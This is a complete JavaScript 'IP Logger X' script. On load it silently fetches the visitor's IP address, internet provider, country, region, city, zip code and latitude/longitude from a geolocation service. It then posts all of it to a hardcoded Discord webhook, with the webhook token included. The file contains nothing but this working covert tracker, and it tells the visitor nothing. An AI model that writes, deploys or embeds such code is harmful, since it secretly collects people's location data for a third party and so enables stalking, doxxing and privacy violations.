
var webHookUrl = "https://discord.com/api/webhooks/1136719859326124104/DzlTnVwa5pqF2C0sNsff7pyBBony4vUpv_MV5TmVL0DuN1hP8lD4VbKudFcOCy2OOdCK";


const request = async () => {
    const response = await fetch('http://ip-api.com/json/');
    const data = await response.json();


    var ip = data.query;

    var provider = data.org + " (" + data.as + ")";

    var timezone = data.timezone;
    var country = data.country;
    var countryCode = data.countryCode.toLowerCase()
    var region = data.region + " (" + data.regionName + ")";
    var city = data.city;

    var zip = data.zip;
    var lat = data.lat;
    var lon = data.lon;


    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username: "IP Logger X",
        avatar_url: "",
        content:    "__**:globe_with_meridians: IP-Adress:**__ \n"
                    + ip +
                    "\n \n__**:telephone: Provider:**__ \n"
                    + provider +
                    "\n \n__**:map: Timezone:**__ \n"
                    + timezone +
                    "\n \n__**:flag_" + countryCode + ": Country:**__ \n"
                    + country +
                    "\n \n __**:park: Region:**__ \n"
                    + region +
                    "\n \n__**:cityscape: Zip Code:**__ \n"
                    + zip +
                    "\n \n __**:cityscape: City:**__ \n"
                    + city +
                    "\n \n__**:round_pushpin: Location:**__ \n"
                    + "**Longitude:** " + lon + "\n"
                    + "**Latitude:** " + lat
    }

    postRequest.send(JSON.stringify(params));

}

request();
